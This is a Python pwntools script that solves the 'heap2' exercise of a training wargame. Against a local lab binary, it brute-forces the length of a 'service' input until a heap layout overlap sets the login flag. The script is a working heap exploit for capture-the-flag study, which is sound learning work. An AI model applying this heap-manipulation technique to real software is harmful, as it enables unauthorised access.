#!/usr/bin/env python3

from __future__ import annotations

import sys
from pathlib import Path

from pwn import log, process

sys.path.append(str(Path(__file__).resolve().parents[1]))
from pwn_solve import set_pwn_context  # noqa: E402


SUCCESS = b"you have logged in already!"


def main() -> int:
    set_pwn_context()

    # Binary is expected to be prebuilt (inside liveoverflow-pwn) and shared via volume.
    prog = str(Path(__file__).resolve().with_name("heap2"))

    # Brute service length; this is allocator-layout dependent but usually small.
    for n in range(1, 120):
        script = b"auth a\n" + (b"service " + (b"A" * n) + b"\n") + b"login\n"
        io = process([prog])
        io.send(script)
        io.shutdown("send")
        out = io.recvrepeat(0.3)
        io.close()
        if SUCCESS in out:
            log.success("heap2 solved (service_len=%d)", n)
            return 0
    log.failure("heap2 failed in range")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
